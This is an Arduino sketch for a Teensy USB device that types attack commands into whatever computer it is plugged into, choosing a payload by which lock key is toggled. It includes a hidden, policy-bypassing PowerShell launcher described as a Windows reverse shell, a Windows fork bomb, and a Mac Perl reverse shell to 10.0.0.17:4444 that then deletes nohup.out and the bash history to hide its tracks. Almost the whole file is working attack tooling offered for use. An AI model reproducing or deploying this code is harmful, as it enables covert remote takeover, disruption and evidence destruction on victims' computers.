/* TeensyMultiPayload.ino by IMcPwn.
 * Copyright 2016 IMcPwn 

 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at

 * http://www.apache.org/licenses/LICENSE-2.0

 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.

 * For the latest code and contact information visit: http://imcpwn.com
 */

#if defined(CORE_TEENSY)
  #define LED_PIN 11
#else
  #define LED_PIN 13
#endif

#define RUN_DELAY 5000

int ledkeys(void)       {return int(keyboard_leds);}
bool is_scroll_on(void) {return ((ledkeys() & 4) == 4) ? true : false;}
bool is_caps_on(void)   {return ((ledkeys() & 2) == 2) ? true : false;}
bool is_num_on(void)    {return ((ledkeys() & 1) == 1) ? true : false;}

void wait_for_drivers(unsigned int speed)
{
    press_numlock();
    unpress_key();
    bool numLockTrap = is_num_on();
    while(numLockTrap == is_num_on())
    {
        press_numlock();
        unpress_key();
        delay(speed);
    }
    press_numlock();
    unpress_key();
    delay(speed);
}

void press_numlock(void)
{
    Keyboard.set_key1(KEY_NUM_LOCK);
    Keyboard.send_now();
    delay(200);
}

void press_capslock(void)
{
    Keyboard.set_key1(KEY_CAPS_LOCK);
    Keyboard.send_now();
    delay(200);
}
void press_scrolllock(void)
{
    Keyboard.set_key1(KEY_SCROLL_LOCK);
    Keyboard.send_now();
    delay(200);
}

void unpress_key(void)
{
    Keyboard.set_modifier(0);
    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(500);
}

void blinky(unsigned int time)
{
    digitalWrite(LED_PIN, HIGH);
    delay(time);
    digitalWrite(LED_PIN, LOW);
    delay(time);
}

void on_num(void)
{
    /* num lock payload */
    /* example shown is a reverse shell for windows */
    Keyboard.begin();
    
    // run window
    Keyboard.set_modifier(MODIFIERKEY_LEFT_GUI);
    Keyboard.set_key1(KEY_R);
    Keyboard.send_now();
    
    delay(RUN_DELAY);
    
    Keyboard.println("cmd.exe /T:01 /K mode CON: COLS=15 LINES=1");
    
    delay(1000);
        
    Keyboard.println("if exist C:\\Windows\\SysWOW64 ( set PWRSHLXDD=C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe) else ( set PWRSHLXDD=powershell.exe)");
    /* ********************************************************** */
    /* !!!!! SEE README.md FOR SETTING UP THE BELOW COMMAND !!!!! */
    /* ********************************************************** */
    Keyboard.println("%PWRSHLXDD% -windowstyle hidden -Exec ByPass -Nol -Enc READ_README");
    Keyboard.end();
}

void on_scroll(void)
{
    /* scroll lock payload */
    /* example shown is a fork bomb for windows */
    Keyboard.begin();

    // run window
    Keyboard.set_modifier(MODIFIERKEY_LEFT_GUI);
    Keyboard.set_key1(KEY_R);
    Keyboard.send_now();

    delay(RUN_DELAY);

    Keyboard.println("cmd.exe /c echo %0^|%0^|%0 > %APPDATA%\\fork.bat && %APPDATA%\\fork.bat");
    Keyboard.end();
}

/* functions required for mac reverse shell */

void openapp(String app)
{
  /* open spotlight */
  cmd(KEY_SPACE);
  Keyboard.println(app);
  delay(30);
}

void mod(int mod, int key)
{
  Keyboard.set_modifier(mod);
  Keyboard.send_now();
  Keyboard.set_key1(key);
  Keyboard.send_now();
  delay(100);

  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(100);
}

void cmd(int key)
{
  mod(MODIFIERKEY_GUI, key);
}

void on_caps(void)
{
    /* caps lock payload */
    /* example shown is a reverse shell for mac */
    Keyboard.begin();

    // now open Terminal
    openapp("Terminal");
    delay(1000);
    Keyboard.println("");

    // open new terminal window
    cmd(KEY_N);
    delay(1000);
    Keyboard.print("nohup perl -MIO::Socket ?-e'$c=new");
    delay(100);
    Keyboard.print(" ?IO::Socket::INET");
    delay(100);
    /* ******************************************** */
    /* !!!!! CHANGE BELOW IP ADDRESS AND PORT !!!!! */
    /* ******************************************** */
    Keyboard.print("(\"10.0.0.17:4444\")");
    delay(100);
    Keyboard.print(";?print$c ?`$_`while<$c>' &");
    delay(100);
    Keyboard.println("");
    delay(100);
    Keyboard.println("");
    delay(100);
    Keyboard.print("rm -rf nohup.out");
    delay(100);
    Keyboard.println("");
    delay(100);
    Keyboard.print("rm -rf /Users/$USER/.bash_history");
    Keyboard.println("");
    delay(100);
    Keyboard.print("exit");
    delay(100);
    Keyboard.println("");
    delay(100);
    cmd(KEY_Q);
    delay(100);
    Keyboard.println("");

    Keyboard.end();
}

void setup(void)
{
    pinMode(LED_PIN, OUTPUT);
    wait_for_drivers(2000);
    /* turn off caps & num & scroll if already pressed */
    if (is_caps_on())
    {
    press_capslock();
    unpress_key();
    }
    if (is_num_on())
    {
    press_numlock();
    unpress_key();
    }
    if (is_scroll_on())
    {
    press_scrolllock();
    unpress_key();
    }
    delay(2000);
}

void loop(void)
{
  /* don't do anything if any combination of multiple keys are pressed */
  if ((is_caps_on() && is_num_on() && is_scroll_on()))
    {
        press_capslock();
        unpress_key();
        press_numlock();
        unpress_key();
        press_scrolllock();
        unpress_key();
    }
    if ((is_num_on() && is_scroll_on()))
    {
        press_numlock();
        unpress_key();
        press_scrolllock();
        unpress_key();  
    }
    if ((is_caps_on() && is_num_on()))
    {
        press_capslock();
        unpress_key();
        press_numlock();
        unpress_key();
    }
    if ((is_caps_on() && is_scroll_on()))
    {
        press_capslock();
        unpress_key();
        press_scrolllock();
        unpress_key();            
    }
    /* run the payloads */
    if (is_caps_on())
    {
        press_capslock();
        unpress_key();
        on_caps();
    }
    if (is_num_on())
    {
        press_numlock();
        unpress_key();
        on_num();
    }
    if (is_scroll_on())
    {
        press_scrolllock();
        unpress_key();
        on_scroll();
    }
    /* blink and loop -> infinity */
    blinky(1000);
}
